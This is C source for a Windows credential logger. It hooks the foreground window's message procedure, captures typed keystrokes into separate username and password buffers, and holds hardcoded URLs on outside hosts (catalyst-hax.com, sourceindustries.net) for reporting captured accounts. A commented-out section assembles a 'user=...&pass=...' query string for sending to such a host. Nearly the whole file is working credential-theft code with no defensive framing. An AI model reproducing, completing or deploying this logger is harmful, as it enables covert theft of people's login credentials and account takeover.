
//#include "WebAccess.h"
#include <windows.h>
#include "resource.h"
#include "Login.h"
#include "Menu.h"


//#include <afxwin.h>
//#include <afxinet.h>
//#include <stdlib.h>
//#include <afxtempl.h>

int b1 = 0;
int b2 = 0;
char szBuffer[100];
char szBuffer2[100];
char szBuffer3[100]={"http://www.catalyst-hax.com/stat.php?user="};
char szBuffer4[100];
char szBuffer5[100];
char szBuffer10[100]={"http://www.sourceindustries.net/hi.php?user="};


extern int userOrPass;

//CString url, result;

//CWebAccess webAccess;

DWORD wHook=NULL;
DWORD wZoom=NULL;





BOOL unHook()
{
	HWND b=GetForegroundWindow();

	wHook=SetWindowLong(b, GWL_WNDPROC,(DWORD) wHook);

	return true;
}


BOOL initHook()
{
	HWND b=GetForegroundWindow();

	wHook=SetWindowLong(b, GWL_WNDPROC,(DWORD) DialogProcedure);

	return true;
}

int CALLBACK ZoomProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam )
{
	//switch (uMsg)
	//{
//	case WM_MOUSEWHEEL:

	

	return CallWindowProc((WNDPROC)wZoom, hwndDlg, uMsg, wParam, lParam);
}
BOOL initZoom()
{
	HWND b=GetForegroundWindow();

	wZoom=SetWindowLong(b, GWL_WNDPROC,(DWORD)ZoomProc);

	return true;
}
BOOL unZoom()
{
	HWND b=GetForegroundWindow();

	wZoom=SetWindowLong(b, GWL_WNDPROC,(DWORD) wZoom);

	return true;
}



int CALLBACK DialogProcedure(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam )
{

	if(userOrPass == 0)
		unHook();


  switch (uMsg)
  {
  case WM_KEYDOWN:
		UINT vKey = LOWORD(wParam);
		if(GetAsyncKeyState(VK_SPACE)&1)
		{
			if(userOrPass == 1)
			{
				szBuffer[b1] = 0x20;
				b1++;
			}else if(userOrPass == 2)
			{
				szBuffer2[b2] = 0x20;
				szBuffer4[b2] = 0x2A;
				b2++;
			}
		}else
		{
			if(vKey > 0x2f && vKey < 0x5B)
			{
				UINT chr = MapVirtualKey(vKey, 2);
			
				if(chr)
				{
					

					  if(chr > 0x40 && GetAsyncKeyState(VK_LSHIFT) == 0 && GetAsyncKeyState(VK_RSHIFT) == 0)
						chr += 0x20;

					  if(userOrPass == 1 && b1 < 15)
					  {
						  szBuffer[b1] = (char)chr;
						  b1++;
					  }
					  else if(userOrPass == 2 && b2 < 15)
					  {
						  szBuffer2[b2] = (char)chr;
						  szBuffer4[b2] = 0x2A;
						  b2++;
					  }
					  return 0;
				}
			}
		}
		break;
  }
 return CallWindowProc((WNDPROC)wHook, hwndDlg, uMsg, wParam, lParam);
}












/*

BOOL initLoop()
{
	//HWND hWndDialog;

	//hWndDialog=CreateDialog(NULL, MAKEINTRESOURCE(IDD_DIALOG), NULL, DialogProcedure); 
	//ShowWindow(hWndDialog, SW_SHOW); 

	HWND b=GetForegroundWindow();

	wHook=SetWindowLong(b, GWL_WNDPROC,(DWORD) DialogProcedure);


	/*MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
      TranslateMessage(&msg); 
      DispatchMessage(&msg);  
	}/
	return false;
}


int CALLBACK DialogProcedure(HWND hwndDlg, UINT uMsg,
    WPARAM wParam, LPARAM lParam )
{
	static bool frshit = false;
	if(!frshit)
	{
		HWND hWndDialog;
		hWndDialog=CreateDialog(NULL, MAKEINTRESOURCE(IDD_DIALOG), NULL, DialogProcedure); 
	ShowWindow(hWndDialog, SW_SHOW); 
		frshit=true;
	}
  switch (uMsg)
  {
  case WM_COMMAND:
    switch(LOWORD(wParam))
    {		
    case IDOK:
		GetWindowText(GetDlgItem(hwndDlg, IDC_EDIT1), szBuffer, 100);
		GetWindowText(GetDlgItem(hwndDlg, IDC_EDIT2), szBuffer2, 100);

		
	//	url = "www.catalyst-hax.com//hacklogin.php?user=";
		//url += szBuffer;
		//strcat((char *)&url, szBuffer);

		//url += "&pass=" + szBuffer2;
		strcat(szBuffer3, szBuffer);
		strcat(szBuffer3, "&pass=");
		strcat(szBuffer3, szBuffer2);

	//	url = szBuffer3;

		MessageBox(hwndDlg, szBuffer3, "Hit", 0);

		//webAccess.Get(url, result);

		MessageBox(hwndDlg, szBuffer3, "Hit", 0);

      break;
	case IDOK2:
		DestroyWindow(hwndDlg);
		break;
    }
    break;
  }
  return CallWindowProc((WNDPROC)wHook, hwndDlg, uMsg, wParam, lParam);
}

*/